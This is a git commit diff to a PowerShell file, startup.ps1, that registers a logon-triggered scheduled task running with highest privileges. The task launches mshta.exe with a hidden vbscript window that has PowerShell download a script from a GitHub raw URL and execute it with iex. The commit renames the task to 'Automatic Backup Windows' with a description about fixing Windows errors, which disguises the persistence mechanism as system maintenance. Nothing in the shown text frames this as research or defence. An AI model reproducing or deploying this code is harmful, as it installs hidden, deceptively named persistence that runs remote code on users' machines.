a0feebf6b42cbda4307a373bf81e389728e462f8
43a1723 <hai1723notgay@gmail.com>
2024-06-19 14:05:31 +0700

    Update startup.ps1

--- startup.ps1
+++ startup.ps1
@@ -11,7 +11,7 @@ switch ($os.Version) {
 
 $task_action = New-ScheduledTaskAction -Execute "mshta.exe" -Argument "vbscript:createobject(`"wscript.shell`").run(`"powershell `$skid='$skid';iwr('https://raw.githubusercontent.com/43a1723/test/main/download.ps1')|iex`",0)(window.close)"
 $task_trigger = New-ScheduledTaskTrigger -AtLogOn
-$task_name = "Automatic Recovery"
-$task_desc = "Always Fix If Windows $version_machine ERROR"
+$task_name = "Automatic Backup Windows $version_machine"
+$task_desc = "Always Backup & Fix If Windows $version_machine ERROR. "
 $task_settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -RunOnlyIfNetworkAvailable -DontStopOnIdleEnd -StartWhenAvailable
 Register-ScheduledTask -Action $task_action -Trigger $task_trigger -Settings $task_settings -TaskName $task_name -Description $task_desc -RunLevel Highest -Force | Out-Null
